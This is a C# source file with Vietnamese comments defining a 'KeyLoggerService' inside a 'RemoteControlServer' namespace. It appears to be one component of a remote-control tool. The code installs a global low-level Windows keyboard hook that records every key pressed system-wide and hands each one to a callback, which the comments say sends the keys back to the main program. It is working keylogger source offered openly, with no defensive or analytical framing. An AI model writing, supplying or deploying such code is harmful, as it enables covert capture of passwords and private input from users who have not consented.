using System;
using System.Diagnostics;
using System.Runtime.InteropServices;
using System.Windows.Forms;

namespace RemoteControlServer
{
    public class KeyLoggerService
    {
        // Import các hàm API của Windows
        [DllImport("user32.dll", CharSet = CharSet.Auto, SetLastError = true)]
        private static extern IntPtr SetWindowsHookEx(int idHook, LowLevelKeyboardProc lpfn, IntPtr hMod, uint dwThreadId);

        [DllImport("user32.dll", CharSet = CharSet.Auto, SetLastError = true)]
        [return: MarshalAs(UnmanagedType.Bool)]
        private static extern bool UnhookWindowsHookEx(IntPtr hhk);

        [DllImport("user32.dll", CharSet = CharSet.Auto, SetLastError = true)]
        private static extern IntPtr CallNextHookEx(IntPtr hhk, int nCode, IntPtr wParam, IntPtr lParam);

        [DllImport("kernel32.dll", CharSet = CharSet.Auto, SetLastError = true)]
        private static extern IntPtr GetModuleHandle(string lpModuleName);

        // Các hằng số định nghĩa Hook bàn phím
        private const int WH_KEYBOARD_LL = 13;
        private const int WM_KEYDOWN = 0x0100;

        // Biến lưu trữ trạng thái Hook
        private static LowLevelKeyboardProc _proc = HookCallback;
        private static IntPtr _hookID = IntPtr.Zero;
        private static Action<string> _callback; // Action gửi phím về Program.cs

        // --- HÀM START HOOK (Đây là hàm mà Program.cs đang tìm) ---
        public static void StartHook(Action<string> callback)
        {
            _callback = callback;
            _hookID = SetHook(_proc);
        }

        // Hàm dừng Hook
        public static void StopHook()
        {
            UnhookWindowsHookEx(_hookID);
        }

        // Thiết lập Hook vào hệ thống
        private static IntPtr SetHook(LowLevelKeyboardProc proc)
        {
            using (Process curProcess = Process.GetCurrentProcess())
            using (ProcessModule curModule = curProcess.MainModule)
            {
                return SetWindowsHookEx(WH_KEYBOARD_LL, proc, GetModuleHandle(curModule.ModuleName), 0);
            }
        }

        private delegate IntPtr LowLevelKeyboardProc(int nCode, IntPtr wParam, IntPtr lParam);

        // Hàm callback: Được gọi mỗi khi có phím nhấn
        private static IntPtr HookCallback(int nCode, IntPtr wParam, IntPtr lParam)
        {
            if (nCode >= 0 && wParam == (IntPtr)WM_KEYDOWN)
            {
                int vkCode = Marshal.ReadInt32(lParam);
                string key = ((Keys)vkCode).ToString();
                
                // Gửi phím về Program.cs thông qua callback
                if (_callback != null) _callback(key);
            }
            return CallNextHookEx(_hookID, nCode, wParam, lParam);
        }
    }
}